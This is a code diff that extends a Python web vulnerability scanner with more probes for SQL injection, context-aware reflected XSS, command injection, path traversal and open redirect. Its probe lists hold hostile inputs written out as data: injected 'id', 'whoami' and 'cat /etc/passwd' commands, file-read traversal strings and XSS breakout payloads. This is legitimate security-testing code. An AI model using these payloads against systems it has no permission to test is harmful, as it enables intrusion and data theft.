@@ -7,6 +7,7 @@ Deterministic detection (detectors.py). Payloads partly from payloads/web/*.
 from __future__ import annotations
 
 import os
+import re
 from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
 
 from ...core.http import HttpClient, Response
@@ -117,21 +118,25 @@ class WebScanner:
 
     def _sqli(self, base: str, path: str, param: str) -> list[Finding]:
         out: list[Finding] = []
-        # 1) error-based: single apostrophe
-        url = _set_param(base, path, param, "1'")
-        r = self.http.get(url)
-        self.log.action(base, self.name, f"SQLi probe {path}?{param}=1'")
-        sig = det.sql_error(r.text)
-        if sig:
-            self._report(out, Finding(
-                title=f"SQL Injection (error-based) in parameter '{param}'",
-                severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-89",
-                target=url, component=f"{path}?{param}", source_tool=self.name,
-                description=f"Injecting an apostrophe triggers a SQL error (signature: {sig}).",
-                impact="Possible database read/modification, authentication bypass.",
-                recommendation="Use parameterized queries (prepared statements).",
-                evidence=Evidence(payload="1'", request=f"GET {url}", response=r.text[:400])))
-            return out  # confirmed, no need for boolean
+        # 1) error-based: try numeric AND string/quote contexts (single/double quote, closing paren)
+        self.log.action(base, self.name, f"SQLi probe {path}?{param}")
+        for probe in ["1'", "'", "\"", "1\"", "')", "1')", "1`"]:
+            url = _set_param(base, path, param, probe)
+            r = self.http.get(url)
+            sig = det.sql_error(r.text)
+            if sig:
+                self._report(out, Finding(
+                    title=f"SQL Injection (error-based) in parameter '{param}'",
+                    severity=Severity.CRITICAL, owasp="A05:2025 Injection", cwe="CWE-89",
+                    target=url, component=f"{path}?{param}", source_tool=self.name,
+                    description=f"Injecting `{probe}` triggers a SQL error (signature: {sig}).",
+                    impact="Possible database read/modification, authentication bypass.",
+                    recommendation="Use parameterized queries (prepared statements).",
+                    evidence=Evidence(payload=probe, request=f"GET {url}", response=r.text[:400])))
+                return out  # confirmed, no need for boolean
+        # 2) boolean-based: differentiating a TRUE vs FALSE condition (resistant to false positives).
+        #    Real SQLi: "1 OR 1=1" (true) and "1 AND 1=2" (false) give DIFFERENT responses.
+        #    Non-SQL (e.g. ping): both variants fail the same way → no difference → no report.
         # 2) boolean-based: differentiating a TRUE vs FALSE condition (resistant to false positives).
         #    Real SQLi: "1 OR 1=1" (true) and "1 AND 1=2" (false) give DIFFERENT responses.
         #    Non-SQL (e.g. ping): both variants fail the same way → no difference → no report.
@@ -160,40 +165,110 @@ class WebScanner:
         return out
 
     def _xss(self, base: str, path: str, param: str) -> list[Finding]:
+        """Context-aware reflected XSS: detects HTML-body, attribute (quote breakout),
+        unquoted-attribute and JS-string contexts, even when angle brackets are HTML-encoded."""
         out: list[Finding] = []
-        marker = "bzX9"
-        payloads = [f"<script>{marker}()</script>", f"\"><svg onload={marker}()>"] + \
-                   _load_payloads(self.payloads_dir, "xss.txt", limit=4)
-        for p in payloads:
-            url = _set_param(base, path, param, p)
-            r = self.http.get(url)
-            if p in r.text and det.escaped_variant(p) != p and det.escaped_variant(p) not in r.text:
-                self.log.action(base, self.name, f"XSS probe {path}?{param}")
-                vis_url = _set_param(base, path, param, "<script>alert(document.domain)</script>")
-                repro = (
-                    "HOW TO REPRODUCE (visible proof):\n"
-                    f"1. Paste this URL into a browser:\n   {vis_url}\n"
-                    "2. The page will execute the injected script → an alert() with the domain pops up = XSS proof.\n"
-                    "Why the scanner's marker was 'invisible': the scanner detects the vulnerability with a safe "
-                    f"payload '{p}' (the bzX9() function call does not exist → the script executes, but "
-                    "WITHOUT a visible effect and without a popup). The <script> tag by itself displays nothing; "
-                    "only alert()/console reveal the execution. Alternatively, open the dev console (F12) "
-                    "with the marker — you will see ReferenceError: bzX9 is not defined (proof that the JS ran).")
-                self._report(out, Finding(
-                    title=f"Reflected XSS in parameter '{param}'",
-                    severity=Severity.HIGH, owasp="A05:2025 Injection", cwe="CWE-79",
-                    target=url, component=f"{path}?{param}", source_tool=self.name,
-                    description="Payload reflected in the response without HTML encoding (HTML body context).",
-                    impact="JS execution in the victim's context (session theft, phishing).",
-                    recommendation="Context-encode the output (HTML-encode); deploy CSP.",
-                    reproduction=repro,
-                    evidence=Evidence(payload=p, request=f"GET {url}", response=r.text[:300])))
-                break
+        can = "bzx9k"
+        r0 = self.http.get(_set_param(base, path, param, can))
+        body = r0.text
+        if can not in body:
+            return out  # not reflected at all
+        self.log.action(base, self.name, f"XSS probe {path}?{param}")
+
+        # which breakout characters survive UN-encoded next to the canary?
+        def survives(suffix: str) -> bool:
+            rr = self.http.get(_set_param(base, path, param, can + suffix))
+            return (can + suffix) in rr.text
+
+        raw_angle = survives("<x>")       # < and > pass raw  → HTML/tag injection
+        raw_dq = survives('"x')           # " passes raw
+        raw_sq = survives("'x")           # ' passes raw
+
+        # the canary can reflect in MULTIPLE places (e.g. a heading AND an input value);
+        # scan every occurrence and stop at the first EXPLOITABLE context.
+        for m in re.finditer(re.escape(can), body):
+            context, quote = self._xss_context(body, m.start())
+            payload, report_ctx, bchar = self._xss_pick(context, quote, raw_angle, raw_dq, raw_sq)
+            if not payload:
+                continue
+            # confirm the breakout character actually lands un-encoded (deterministic proof)
+            cm = can + bchar + "bzc"
+            if cm not in self.http.get(_set_param(base, path, param, cm)).text:
+                continue
+            vis_url = _set_param(base, path, param, payload)
+            repro = (f"HOW TO REPRODUCE ({report_ctx}):\n"
+                     f"1. Open this URL in a browser:\n   {vis_url}\n"
+                     f"2. Payload `{payload}` breaks out of the {report_ctx} context and runs alert(document.domain).\n"
+                     "   (For attribute/event-handler payloads you may need to hover/focus the element.)")
+            self._report(out, Finding(
+                title=f"Reflected XSS ({report_ctx}) in parameter '{param}'",
+                severity=Severity.HIGH, owasp="A05:2025 Injection", cwe="CWE-79",
+                target=vis_url, component=f"{path}?{param}", source_tool=self.name,
+                description=f"Input reflected in the {report_ctx} context and exploitable there "
+                            "(the required breakout character is returned un-encoded).",
+                impact="JS execution in the victim's context (session theft, phishing, account takeover).",
+                recommendation="Context-aware output encoding; deploy a strict CSP.",
+                reproduction=repro,
+                evidence=Evidence(payload=payload, request=f"GET {vis_url}",
+                                  response=self.http.get(vis_url).text[:300])))
+            break
         return out
+
+    @staticmethod
+    def _xss_pick(context: str, quote: str, raw_angle: bool, raw_dq: bool,
+                  raw_sq: bool) -> tuple[str, str, str]:
+        """Pick a working breakout payload for the (context, quote) given which chars survive.
+        Returns (payload, human_context, breakout_char) or ("", "", "")."""
+        if raw_angle:  # angle brackets survive → classic tag injection in any context
+            if context == "body":
+                return ("<svg onload=alert(document.domain)>", "HTML body", "<")
+            return ("\"><svg onload=alert(document.domain)>", f"{context} (breaks out with >)", "<")
+        if context == "attr" and quote == '"' and raw_dq:
+            return ("\" autofocus onfocus=\"alert(document.domain)",
+                    "HTML attribute (double-quote breakout)", '"')
+        if context == "attr" and quote == "'" and raw_sq:
+            return ("' autofocus onfocus='alert(document.domain)",
+                    "HTML attribute (single-quote breakout)", "'")
+        if context == "attr" and quote == "":
+            return (" onmouseover=alert(document.domain) x", "HTML attribute (unquoted)", " ")
+        if context == "js" and quote == "'" and raw_sq:
+            return ("';alert(document.domain)//", "JavaScript string (single-quote)", "'")
+        if context == "js" and quote == '"' and raw_dq:
+            return ("\";alert(document.domain)//", "JavaScript string (double-quote)", '"')
+        return ("", "", "")
+
+    @staticmethod
+    def _xss_context(body: str, idx: int) -> tuple[str, str]:
+        """Classify the reflection context around position idx. Returns (context, quote)
+        where context in {body, attr, js} and quote in {\", ', ''}."""
+        if idx < 0:
+            return ("body", "")
+        before = body[max(0, idx - 120):idx]
+        # inside <script>...</script> ?
+        if before.rfind("<script") > before.rfind("</script"):
+            if before.count("'") % 2 == 1:
+                return ("js", "'")
+            if before.count('"') % 2 == 1:
+                return ("js", '"')
+            return ("js", "")
+        # inside an open tag, in a quoted attribute value?
+        m = re.search(r"<[^>]*?=\s*([\"'])[^\"']*$", before)
+        if m:
+            return ("attr", m.group(1))
+        # inside an open tag, unquoted attribute value?
+        if re.search(r"<[^>]*?=\s*[^\"'\s>]*$", before):
+            return ("attr", "")
+        return ("body", "")
 
     def _cmdi(self, base: str, path: str, param: str) -> list[Finding]:
         out: list[Finding] = []
-        for p in ["127.0.0.1;id", "127.0.0.1| id", "1;id"]:
+        # many separator styles + inline/newline substitution + Windows
+        payloads = [
+            "127.0.0.1;id", "127.0.0.1| id", "1;id", "; id", "| id", "|| id", "&& id",
+            "`id`", "$(id)", "1\nid", "%0aid", ";cat /etc/passwd", "|cat /etc/passwd",
+            "& whoami", "| whoami", ";${IFS}id",
+        ]
+        for p in payloads:
             url = _set_param(base, path, param, p)
             r = self.http.get(url)
             sig = det.cmd_injected(r.text)
@@ -213,8 +288,13 @@ class WebScanner:
     def _traversal(self, base: str, path: str, param: str) -> list[Finding]:
         out: list[Finding] = []
         deep = "../" * 14
+        winup = "..\\" * 14
         for p in [deep + "etc/passwd", "..%2f" * 14 + "etc%2fpasswd",
-                  "....//" * 14 + "etc/passwd", "../../../../../../etc/passwd"]:
+                  "....//" * 14 + "etc/passwd", "../../../../../../etc/passwd",
+                  deep + "etc/passwd%00", "%2e%2e%2f" * 14 + "etc%2fpasswd",
+                  "php://filter/convert.base64-encode/resource=/etc/passwd",
+                  "/proc/self/environ", "file:///etc/passwd",
+                  winup + "windows\\win.ini", deep + "windows/win.ini"]:
             url = _set_param(base, path, param, p)
             r = self.http.get(url)
             sig = det.traversal_ok(r.text)
@@ -233,20 +313,26 @@ class WebScanner:
 
     def _open_redirect(self, base: str, path: str, param: str) -> list[Finding]:
         out: list[Finding] = []
-        evil = "https://evil.example/x"
-        url = _set_param(base, path, param, evil)
-        r = self.http.get(url)
-        loc = r.header("Location") or ""
-        if r.status in (301, 302, 303, 307, 308) and evil in loc:
-            self.log.action(base, self.name, f"Open redirect {path}?{param}")
-            self._report(out, Finding(
-                title=f"Open Redirect in parameter '{param}'",
-                severity=Severity.MEDIUM, owasp="A01:2025 Broken Access Control", cwe="CWE-601",
-                target=url, component=f"{path}?{param}", source_tool=self.name,
-                description="The application redirects to an arbitrary external URL.",
-                impact="Phishing, filter bypass, OAuth token theft.",
-                recommendation="Allowlist redirect targets; use relative paths.",
-                evidence=Evidence(payload=evil, response=f"HTTP {r.status} Location: {loc}")))
+        # variants: absolute, scheme-relative, backslash trick, no-slashes, userinfo, whitespace
+        variants = ["https://evil.example/x", "//evil.example/x", "/\\evil.example",
+                    "https:evil.example", "https://trusted.example@evil.example",
+                    "/%09/evil.example", "https://evil.example%2f%2e%2e"]
+        for evil in variants:
+            url = _set_param(base, path, param, evil)
+            r = self.http.get(url)
+            loc = r.header("Location") or ""
+            if r.status in (301, 302, 303, 307, 308) and ("evil.example" in loc and
+                                                          not loc.startswith(base)):
+                self.log.action(base, self.name, f"Open redirect {path}?{param}")
+                self._report(out, Finding(
+                    title=f"Open Redirect in parameter '{param}'",
+                    severity=Severity.MEDIUM, owasp="A01:2025 Broken Access Control", cwe="CWE-601",
+                    target=url, component=f"{path}?{param}", source_tool=self.name,
+                    description="The application redirects to an arbitrary external URL.",
+                    impact="Phishing, filter bypass, OAuth token theft.",
+                    recommendation="Allowlist redirect targets; use relative paths.",
+                    evidence=Evidence(payload=evil, response=f"HTTP {r.status} Location: {loc}")))
+                break
         return out
 
     def _ssti(self, base: str, path: str, param: str) -> list[Finding]:
